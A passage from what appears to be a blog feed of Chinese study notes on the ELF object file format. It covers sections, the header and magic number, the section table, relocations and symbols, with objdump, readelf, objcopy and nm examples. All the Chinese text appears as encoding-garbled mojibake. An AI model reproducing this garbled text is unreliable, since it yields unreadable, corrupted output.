call   50 &lt;main+0x34&gt;</span><br><span class="line">  54:83 c4 10             add    $0x10,%esp</span><br><span class="line">  57:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  5c:8b 4d fc             mov    -0x4(%ebp),%ecx</span><br><span class="line">  5f:c9                   leave  </span><br><span class="line">  60:8d 61 fc             lea    -0x4(%ecx),%esp</span><br><span class="line">  63:c3                   ret</span><br></pre></td></tr></table></figure><blockquote><p>é€šè¿‡ä¸Šé¢è¿™æ®µä»£ç </p><p>æˆ‘ä»¬å¯¹æ–‡ä»¶å†…å®¹æœ‰äº†æ›´æ·±å…¥çš„äº†è§£</p><p>æœ€å·¦é¢æ˜¯åç§»é‡ï¼Œä¸­é—´æ˜¯16è¿›åˆ¶å†…å®¹ï¼Œå³é¢æ˜¯asciiå½¢å¼</p><p>åæ±‡ç¼–ç»“æœæˆ‘ä»¬ä¹Ÿå¾ˆç†Ÿæ‚‰</p></blockquote><h3 id="3-2-æ•°æ®æ®µå’Œåªè¯»æ•°æ®æ®µ"><a href="#3-2-æ•°æ®æ®µå’Œåªè¯»æ•°æ®æ®µ" class="headerlink" title="3.2 æ•°æ®æ®µå’Œåªè¯»æ•°æ®æ®µ"></a>3.2 æ•°æ®æ®µå’Œåªè¯»æ•°æ®æ®µ</h3><p><code>.data</code>æ®µä¿å­˜<strong>å·²ç»åˆå§‹åŒ–äº†çš„å…¨å±€é™æ€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡</strong>,æ‰€ä»¥ä¸Šé¢ç¨‹åºä¸­<code>.data</code>æ˜¯å…«ä¸ªå­—èŠ‚</p><p><code>.rodata</code>å­˜æ”¾åªè¯»æ•°æ®ï¼Œä¸€èˆ¬æ˜¯ç¨‹åºé‡Œé¢çš„åªè¯»å˜é‡å’Œå­—ç¬¦ä¸²å¸¸é‡ï¼Œä¾‹å¦‚ä¸Šé¢ä¸­<code>printf</code>çš„å‚æ•°<code>%d\n\0</code>æ˜¯å››ä¸ªå­—èŠ‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Contents of section .data:</span><br><span class="line"> 0000 54000000 55000000                    T...U...        </span><br><span class="line">Contents of section .rodata:</span><br><span class="line"> 0000 25640a00                             %d..</span><br></pre></td></tr></table></figure><blockquote><p>ä¹Ÿå¯ä»¥çœ‹å‡º<code>.data</code>æ˜¯84 85ä»ä½åˆ°é«˜æ˜¯0x54 0x00 0x00 0x00</p><p><code>.rodata</code>æ˜¯%d\n\0</p></blockquote><h3 id="3-3-BSSæ®µ"><a href="#3-3-BSSæ®µ" class="headerlink" title="3.3 BSSæ®µ"></a>3.3 BSSæ®µ</h3><p><code>.bss</code>æ®µå­˜å‚¨<strong>æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡</strong>ã€‚</p><h3 id="3-4-å…¶ä»–æ®µ"><a href="#3-4-å…¶ä»–æ®µ" class="headerlink" title="3.4 å…¶ä»–æ®µ"></a>3.4 å…¶ä»–æ®µ</h3><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210140348425.png" alt="image-20210210140348425"></p><p>è¿™äº›æ®µéƒ½æ˜¯ç”±.æ¥åšå‰ç¼€ï¼Œè¯´æ˜è¿™äº›è¡¨çš„åå­—æ˜¯ç³»ç»Ÿä¿ç•™çš„ã€‚æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰æ®µåï¼Œå¹¶åœ¨æ–‡ä»¶ä¸­æ’å…¥è¿™ä¸ªæ®µï¼Œè¾¾åˆ°è‡ªå·±æƒ³å¹²çš„äº‹æƒ…ã€‚</p><blockquote><p>å°†ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶å¦‚å›¾ç‰‡ï¼ŒéŸ³ä¹ä½œä¸ºç›®æ ‡æ–‡ä»¶çš„ä¸€ä¸ªæ®µ</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objcopy -I binary -O elf32-i386 -B i386 image.jpg image.o</span><br><span class="line">objdump -ht image.o</span><br></pre></td></tr></table></figure><h2 id="4-ELFæ–‡ä»¶ç»“æ„æè¿°"><a href="#4-ELFæ–‡ä»¶ç»“æ„æè¿°" class="headerlink" title="4.ELFæ–‡ä»¶ç»“æ„æè¿°"></a>4.ELFæ–‡ä»¶ç»“æ„æè¿°</h2><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210141207866.png" alt="image-20210210141207866"></p><p>ELFç›®æ ‡æ–‡ä»¶æ ¼å¼æœ€å‰é¢æ˜¯<strong>ELFæ–‡ä»¶å¤´</strong>ï¼ŒåŒ…å«æ•´ä¸ªæ–‡ä»¶çš„åŸºæœ¬å±æ€§ï¼Œå¦‚ELFæ–‡ä»¶ç‰ˆæœ¬ã€ç›®æ ‡æœºå™¨å‹å·ã€ç¨‹åºå…¥å£åœ°å€ç­‰ã€‚</p><p>åœ¨ELFæ–‡ä»¶ä¸­ä¸æ®µæœ‰å…³çš„é‡è¦ç»“æ„å°±æ˜¯æ®µè¡¨(Section Hearder Table)ï¼Œè¯¥è¡¨æè¿°äº†ELFæ–‡ä»¶åŒ…å«çš„æ‰€æœ‰æ®µçš„ä¿¡æ¯ï¼Œå¦‚æ¯ä¸ªæ®µçš„æ®µåã€æ®µçš„é•¿åº¦ã€åœ¨æ–‡ä»¶ä¸­çš„åç§»å’Œè¯»å†™æƒé™ç­‰ã€‚</p><h3 id="4-1-æ–‡ä»¶å¤´"><a href="#4-1-æ–‡ä»¶å¤´" class="headerlink" title="4.1 æ–‡ä»¶å¤´"></a>4.1 æ–‡ä»¶å¤´</h3><p>æŸ¥çœ‹ELFæ–‡ä»¶</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210141759681.png" alt="image-20210210141759681"></p><p>ELFå¤´ä¸­åŒ…æ‹¬äº†<strong>é­”æ•°ï¼Œæ–‡ä»¶æœºå™¨å­—èŠ‚é•¿åº¦ã€æ•°æ®å­˜å‚¨æ–¹å¼ã€ç‰ˆæœ¬ã€è¿è¡Œå¹³å°ã€ABIç‰ˆæœ¬ã€é‡å®šä½ç±»å‹ã€ç¡¬ä»¶å¹³å°ã€å¹³å°ç‰ˆæœ¬ã€å…¥å£åœ°å€ã€ç¨‹åºå¤´å…¥å£å’Œé•¿åº¦ã€æ®µè¡¨ä½ç½®å’Œé•¿åº¦åŠæ®µçš„æ•°é‡</strong></p><p>ä¸ºäº†æ›´å¥½å®šä¹‰å„ä¸ªæˆå‘˜å¤§å°ã€elf.hæœ‰ä¸€å¥—è‡ªå·±å˜é‡ä½“ç³»</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142310041.png" alt="image-20210210142310041"></p><p>ä¸‹é¢æ¥çœ‹ä¸€ä¸‹â€œElf32_Ehdrâ€è¿™ä¸ªç»“æ„ä½“</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142459097.png" alt="image-20210210142459097"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142507074.png" alt="image-20210210142507074"></p><p>ä¹‹åæˆ‘ä»¬æ¥å¯¹ç…§ä¸€ä¸‹</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142536099.png" alt="image-20210210142536099"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142548337.png" alt="image-20210210142548337"></p><p>è¿™é‡Œå…·ä½“æ¥è¯´ä¸€ä¸‹é­”æ•°</p><p><strong>é­”æ•°</strong>ï¼š</p><p>ELFçš„é­”æ•°ä¸Šé¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯16å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯å¯¹åº”çš„16ä¸ªæ•°ç»„</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142844872.png" alt="image-20210210142844872"></p><p>æœ€å¼€å§‹çš„4ä¸ªå­—èŠ‚æ˜¯ELFæ–‡ä»¶å¿…é¡»ç›¸åŒçš„æ ‡è¯†ç </p><p>ä¸º0x7F 0x45 0x4C 0x46 7Fæ˜¯asciiä¸­çš„DELæ§åˆ¶ç¬¦ï¼Œ45 4c 46åˆ†åˆ«æ˜¯asciiä¸­çš„ELFã€‚å‡ ä¹æ‰€æœ‰å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼å¼€å§‹éƒ½æ˜¯é­”æ•°ï¼Œå¦‚a.outçš„0x01 0x07ï¼ŒPEä¸­çš„0x4d 0x5aã€‚</p><p>é‚£ä¹ˆé­”æ•°æ˜¯æ¥å¹²ä»€ä¹ˆçš„ï¼Ÿæ¨¡å¼æ˜¯ç”¨æ¥ç¡®è®¤æ–‡ä»¶çš„ç±»å‹ï¼Œæ“ä½œç³»ç»Ÿåœ¨åŠ è½½å¯æ‰§è¡Œæ–‡ä»¶çš„æ—¶å€™ä¼šç¡®è®¤é­”æ•°æ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœä¸æ­£ç¡®å°†ä¼šæ‹’ç»åŠ è½½ã€‚</p><p>ä¸‹ä¸€ä¸ªå­—èŠ‚æ˜¯0x01è¡¨ç¤º32ä½ 0x02è¡¨ç¤º64ä½ </p><p>ç¬¬6ä¸ªå­—èŠ‚åº è§„å®šæ˜¯å¤§ç«¯è¿˜æ˜¯å°ç«¯</p><p>ç¬¬7ä¸ªæ˜¯ä¸»ç‰ˆæœ¬å·ï¼Œä¸€èˆ¬ä¸º1ã€‚åé¢çš„9ä¸ªä¸€èˆ¬å¡«0</p><p><strong>æ–‡ä»¶ç±»å‹</strong></p><p>e_typeæˆå‘˜è¡¨ç¤ºæ–‡ä»¶ç±»å‹ï¼Œå°±æ˜¯å‰é¢è¯´çš„ä¸‰ç§æ–‡ä»¶ç±»å‹ã€‚</p><p>æ“ä½œç³»ç»Ÿé€šè¿‡è¿™ä¸ªæ¥åˆ¤æ–­ELFæ–‡ä»¶ç±»å‹ï¼Œè€Œä¸æ˜¯é€šè¿‡åç¼€åã€‚</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210143702078.png" alt="image-20210210143702078"></p><h3 id="4-2-æ®µè¡¨"><a href="#4-2-æ®µè¡¨" class="headerlink" title="4.2 æ®µè¡¨"></a>4.2 æ®µè¡¨</h3><p><strong>æ®µè¡¨ï¼ˆSection Header Tableï¼‰</strong>æ˜¯ä¿å­˜è¿™äº›æ®µçš„åŸºæœ¬å±æ€§çš„ç»“æ„ã€‚</p><p>å¯ä»¥è¯´ï¼ŒELFæ–‡ä»¶çš„æ®µç»“æ„å°±æ˜¯ç”±æ®µè¡¨æ¥å†³å®šçš„ï¼Œç¼–è¯‘å™¨ã€é“¾æ¥å™¨ã€å’Œè£…è½½å™¨éƒ½æ˜¯ä¾é æ®µè¡¨æ¥å®šä½å’Œè®¿é—®å„ä¸ªæ®µçš„å±æ€§çš„ã€‚</p><p>æ®µè¡¨ç”±ELFæ–‡ä»¶å¤´çš„<code>e_shoff</code>æˆå‘˜å†³å®šã€‚</p><p>ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹çœŸæ­£çš„æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S a.o</span><br><span class="line">&#x2F;&#x2F;å„ä¸ªæ®µ</span><br></pre></td></tr></table></figure><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210144604296.png" alt="image-20210210144604296"></p><p>æ¯ä¸ªæ®µéƒ½æ˜¯ä»¥<code>Elf32_Shdr</code>ç»“æ„ä½“ï¼Œå› æ­¤<code>Elf32_Shdr</code>åˆå«åš<strong>æ®µæè¿°ç¬¦</strong></p><p>æ‰€ä»¥ä¸Šé¢å°±æ˜¯æœ‰13ä¸ªç»“æ„ä½“ï¼Œæ­¤å¤–ç¬¬ä¸€ä¸ªæ˜¯æ— ç”¨çš„ï¼Œæ‰€ä»¥åªæœ‰12ä¸ªæœ‰æ•ˆæ®µã€‚</p><p>å¯ä»¥æ¥çœ‹ä¸€ä¸‹<code>Elf32_Shdr</code></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210144945550.png" alt="image-20210210144945550"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210145159772.png" alt="image-20210210145159772"></p><p><strong>æ®µçš„ç±»å‹</strong></p><p>æ®µçš„åå­—åªåœ¨é“¾æ¥å’Œç¼–è¯‘ä¸­æœ‰æ„ä¹‰ï¼Œä½†ä¸èƒ½çœŸæ­£è¡¨ç¤ºæ®µçš„ç±»å‹ã€‚</p><p>å¯¹äºç¼–è¯‘å™¨å’Œé“¾æ¥å™¨æ¥è¯´ï¼Œ<strong>ä¸»è¦å†³å®šæ®µçš„å±æ€§æ˜¯æ®µçš„ç±»å‹ï¼ˆsh_typeï¼‰å’Œæ®µçš„æ ‡å¿—ä½(sh_flags)</strong></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210145930584.png" alt="image-20210210145930584"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210145922440.png" alt="image-20210210145922440"></p><p><strong>æ®µçš„æ ‡å¿—ä½</strong></p><p>æ®µçš„æ ‡å¿—ä½è¡¨ç¤ºè¯¥æ®µåœ¨è¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„å±æ€§ï¼Œå¦‚æ˜¯å¦å¯å†™å¯æ‰§è¡Œç­‰ã€‚</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150400718.png" alt="image-20210210150400718"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150408040.png" alt="image-20210210150408040"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150429555.png" alt="image-20210210150429555"></p><p><strong>æ®µçš„é“¾æ¥ä¿¡æ¯</strong></p><p>å¦‚æœæ®µç±»å‹æ˜¯ä¸é“¾æ¥ç›¸å…³çš„ï¼Œå¦‚é‡å®šä½è¡¨ã€ç¬¦å·è¡¨ç­‰ï¼Œé‚£ä¹ˆsh_linkå’Œsh_infoæ˜¯æœ‰æ„ä¹‰çš„</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150637999.png" alt="image-20210210150637999"></p><h3 id="4-3-é‡å®šä½è¡¨"><a href="#4-3-é‡å®šä½è¡¨" class="headerlink" title="4.3 é‡å®šä½è¡¨"></a>4.3 é‡å®šä½è¡¨</h3><p>é“¾æ¥å™¨åœ¨å¤„ç†ç›®æ ‡æ–‡ä»¶æ—¶ï¼Œéœ€è¦å¯¹ç›®æ ‡æ–‡ä»¶ä¸­æŸäº›éƒ¨ä½è¿›è¡Œé‡å®šä½ï¼Œå³ä»£ç æ®µå’Œæ•°æ®æ®µä¸­é‚£äº›å¯¹ç»å¯¹åœ°å€å¼•ç”¨çš„ä½ç½®ã€‚è¿™äº›é‡å®šä½è®°å½•éƒ½ä¼šè®°å½•åœ¨é‡å®šä½è¡¨é‡Œã€‚</p><p><code>.rel.text</code>å°±æ˜¯ä¸€ä¸ªé‡å®šä½è¡¨ã€‚</p><p><strong>æ¯ä¸ªé‡å®šä½çš„æ®µéƒ½ä¼šæœ‰ä¸€ä¸ªç›¸åº”çš„é‡å®šä½çš„è¡¨</strong>ã€‚</p><p>å¦‚<code>.text</code>ä¸­æœ‰<code>printf</code>çš„è°ƒç”¨ï¼Œæ‰€ä»¥å°±ä¼šæœ‰<code>.rel.text</code>è€Œ<code>.data</code>å°±æ²¡æœ‰é‡å®šä½çš„ã€‚</p><p>é‡å®šä½è¡¨åŒæ—¶ä¹Ÿæ˜¯ELFçš„ä¸€ä¸ªæ®µï¼Œæ‰€ä»¥è¿™ä¸ªæ®µçš„ç±»å‹å°±æ˜¯<code>SHT_REL</code>ç±»å‹ã€‚<code>sh_link</code>å°±æ˜¯ç¬¦å·è¡¨çš„ä¸‹æ ‡ï¼Œ<code>sh_info</code>å°±æ˜¯ä½œç”¨äºå“ªä¸ªæ®µã€‚</p><hr><h3 id="4-4-å­—ç¬¦ä¸²è¡¨"><a href="#4-4-å­—ç¬¦ä¸²è¡¨" class="headerlink" title="4.4 å­—ç¬¦ä¸²è¡¨"></a>4.4 å­—ç¬¦ä¸²è¡¨</h3><p>å­—ç¬¦ä¸²ç”±äºæ¯”è¾ƒå¤æ‚ï¼Œæ‰€ä»¥æŠŠå­—ç¬¦ä¸²é›†ä¸­åœ¨ä¸€ä¸ªè¡¨é‡Œå°±å¾ˆç®€ä¾¿ï¼Œç„¶åç”¨åç§»æ¥è¡¨ç¤ºå­—ç¬¦ä¸²ã€‚</p><h2 id="5-ç¬¦å·"><a href="#5-ç¬¦å·" class="headerlink" title="5.ç¬¦å·"></a>5.ç¬¦å·</h2><p>åœ¨é“¾æ¥ä¸­ï¼Œç›®æ ‡æ–‡ä»¶ä¸­é—´ç›¸äº’æ‹¼åˆå®é™…ä¸Šæ˜¯ç›®æ ‡æ–‡ä»¶ä¹‹é—´å¯¹åœ°å€çš„å¼•ç”¨ã€‚å³å¯¹å‡½æ•°å’Œå˜é‡çš„åœ°å€çš„å¼•ç”¨ã€‚</p><p>å¦‚ç›®æ ‡æ–‡ä»¶Bç”¨ç›®æ ‡æ–‡ä»¶Aä¸­fooå‡½æ•°ï¼Œé‚£ä¹ˆå°±æ˜¯ç›®æ ‡æ–‡ä»¶A<strong>å®šä¹‰äº†foo</strong>ï¼Œç›®æ ‡æ–‡ä»¶B<strong>å¼•ç”¨äº†foo</strong>ã€‚</p><p>åœ¨é“¾æ¥ä¸­ï¼Œæˆ‘ä»¬å°†å‡½æ•°å’Œå˜é‡ç»Ÿç§°ä¸º<strong>ç¬¦å·</strong>ï¼Œå‡½æ•°åå’Œå˜é‡åä¸º<strong>ç¬¦å·å</strong></p><p><strong>åœ¨é“¾æ¥è¿‡ç¨‹ä¸­å¾ˆå…³é”®å°±æ˜¯ç¬¦å·çš„ç®¡ç†ï¼Œæ¯ä¸€ä¸ªç›®æ ‡æ–‡ä»¶éƒ½ä¼šæœ‰ä¸€ä¸ªç›¸åº”çš„ç¬¦å·è¡¨ï¼Œè¿™ä¸ªè¡¨é‡Œé¢è®°å½•äº†ç›®æ ‡æ–‡ä»¶ç”¨åˆ°çš„æ‰€æœ‰ç¬¦å·ã€‚æ¯ä¸ªå®šä¹‰çš„ç¬¦å·æœ‰ä¸€ä¸ªå¯¹åº”çš„å€¼å«ç¬¦å·å€¼ï¼Œç¬¦å·å€¼å°±æ˜¯åœ°å€ã€‚</strong></p><p>å…·ä½“ç¬¦å·æœ‰ä¸‹é¢å‡ ç§ç±»å‹</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210153736035.png" alt="image-20210210153736035"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nm a.o</span><br><span class="line">&#x2F;&#x2F;çœ‹ç¬¦å·</span><br></pre></td></tr></table></figure><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210203929970.png" alt="image-20210210203929970"></p><h3 id="5-1-ELFç¬¦å·è¡¨ç»“æ„"><a href="#5-1-ELFç¬¦å·è¡¨ç»“æ„" class="headerlink" title="5.1 ELFç¬¦å·è¡¨ç»“æ„"></a>5.1 ELFç¬¦å·è¡¨ç»“æ„</h3><p>ELFæ–‡ä»¶ä¸­ç¬¦å·è¡¨å¾€å¾€æ˜¯ä¸€ä¸ªæ®µï¼Œä¸€èˆ¬å«åš<code>.symtab</code>ã€‚ç¬¦å·è¡¨çš„ç»“æ„æ˜¯ä¸€ä¸ªELF32_Symç»“æ„çš„æ•°ç»„ï¼Œæ¯ä¸ªç»“æ„éƒ½æ˜¯ä¸€ä¸ªç¬¦å·ã€‚</p><p>Elf32_Symçš„ç»“æ„å®šä¹‰</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204148472.png" alt="image-20210210204148472"></p><p>æˆå‘˜æ„ä¹‰å¦‚ä¸‹å›¾</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204233887.png" alt="image-20210210204233887"></p><p><strong>ç¬¦å·ç±»å‹å’Œç»‘å®šä¿¡æ¯ï¼ˆst_infoï¼‰</strong></p><p>æˆå‘˜ä½4ä¸ºæ˜¯ç¬¦å·çš„ç±»å‹ï¼Œé«˜28ä¸ºè¡¨ç¤ºç¬¦å·ç»‘å®šä¿¡æ¯</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204418983.png" alt="image-20210210204418983"></p><p><strong>ç¬¦å·æ‰€åœ¨æ®µï¼ˆst_shndxï¼‰</strong></p><p>å¦‚æœç¬¦å·å®šä¹‰åœ¨æœ¬ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªæˆå‘˜è¡¨ç¤ºç¬¦å·æ‰€åœ¨çš„æ®µåœ¨æ®µè¡¨çš„ä¸‹æ ‡ï¼›ä½†å¦‚æœç¬¦å·ä¸æ˜¯å®šä¹‰åœ¨æœ¬ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œæˆ–è€…å¯¹äºæœ‰äº›ç‰¹æ®Šç¬¦å·ï¼Œsh_shndxçš„å€¼ä¼šæœ‰äº›ç‰¹æ®Š</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204647740.png" alt="image-20210210204647740"></p><p><strong>ç¬¦å·å€¼</strong></p><p>ä¸Šæ–‡è¯´äº†ï¼Œç¬¦å·å€¼å°±æ˜¯æ¯ä¸€ä¸ªç¬¦å·çš„å˜é‡åœ°å€</p><p>å…·ä½“æ¥è¯´ï¼Œæœ‰ä»¥ä¸‹å‡ ç§ç±»å‹</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204943554.png" alt="image-20210210204943554"></p><p>çœ‹ä¸€ä¸‹æˆ‘ä»¬çš„ç¬¦å·è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -s a.o</span><br></pre></td></tr></table></figure><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210205129282.png" alt="image-20210210205129282"></p><blockquote><p>ç¬¬ä¸€åˆ—Numå°±æ˜¯æ•°ç»„ä¸‹æ ‡ï¼Œä»é›¶å¼€å§‹</p><p>ç¬¬äºŒåˆ—vauleå°±æ˜¯ç¬¦å·å€¼ï¼Œ<code>st_value</code></p><p>ç¬¬ä¸‰åˆ—Sizeä¸ºç¬¦å·å¤§å°<code>st_size</code></p><p>ç¬¬å››åˆ—å’Œç¬¬äº”åˆ—ä¸ºç¬¦å·ç±»å‹å’Œç»‘å®šä¿¡æ¯</p><p>ç¬¬ä¸ƒåˆ—å°±æ˜¯Ndxå³<code>st_shndx</code>è¡¨ç¤ºç¬¦å·æ‰€åœ¨çš„æ®µã€‚</p><p>æœ€åä¸€åˆ—å°±æ˜¯ç¬¦å·åç§°</p></blockquote><p>å…·ä½“è§£é‡Šå¦‚ä¸‹</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210205708052.png" alt="image-20210210205708052"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210205716690.png" alt="image-20210210205716690"></p><h3 id="5-2-ç‰¹æ®Šç¬¦å·"><a href="#5-2-ç‰¹æ®Šç¬¦å·" class="headerlink" title="5.2 ç‰¹æ®Šç¬¦å·"></a>5.2 ç‰¹æ®Šç¬¦å·</h3><p>ç‰¹æ®Šç¬¦å·å°±æ˜¯ä½ æ— é¡»å®šä¹‰å®ƒä»¬ï¼Œä½†ä½ å¯ä»¥å£°æ˜å¹¶ä½¿ç”¨ä»–ä»¬ã€‚</p><p>å¹¶ä¸”åªæœ‰ç”¨ldé“¾æ¥å™¨ç”Ÿäº§æœ€ç»ˆå¯æ‰§è¡Œæ–‡ä»¶è¿™äº›ç¬¦å·æ‰ä¼šå­˜åœ¨ï¼Œé“¾æ¥å™¨ä¼šåœ¨å°†ç¨‹åºæœ€ç»ˆé“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶æ˜¯å°†å…¶è§£ææˆæ­£ç¡®çš„å€¼ã€‚</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210211122171.png" alt="image-20210210211122171"></p><p>åé¢çš„ç­¾åã€å¼ºå¼±å°±è·³è¿‡äº†ï¼Œéœ€è¦æ—¶ç»§ç»­ç ”ç©¶ã€‚</p><h1 id="0x03-é™æ€é“¾æ¥"><a href="#0x03-é™æ€é“¾æ¥" class="headerlink" title="0x03 é™æ€é“¾æ¥"></a>0x03 é™æ€é“¾æ¥</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-ç¼–è¯‘å’Œé“¾æ¥&quot;&gt;&lt;a href=&quot;#0x01-ç¼–è¯‘å’Œé“¾æ¥&quot; class=&quot;headerlink&quot; title=&quot;0x01 ç¼–è¯‘å’Œé“¾æ¥&quot;&gt;&lt;/a&gt;0x01 ç¼–è¯‘å’Œé“¾æ¥&lt;/h1&gt;&lt;h2 id=&quot;1-è¢«éšè—äº†çš„è¿‡ç¨‹&quot;&gt;&lt;a href=&quot;#1-è¢«éšè—äº†çš„è¿‡ç¨‹&quot; c</summary>
      
    
    
    
    
    <category term="è¯»ä¹¦ç¬”è®°" scheme="https://pz1o.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€é“æ ˆé¢˜</title>
    <link href="https://pz1o.top/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/"/>
    <id>https://pz1o.top/2021/02/14/%E4%B8%80%E9%81%93%E6%A0%88%E9%A2%98/</id>
    <published>2021-02-14T08:54:00.000Z</published>
    <updated>2021-02-15T07:15:54.420Z</updated>
    
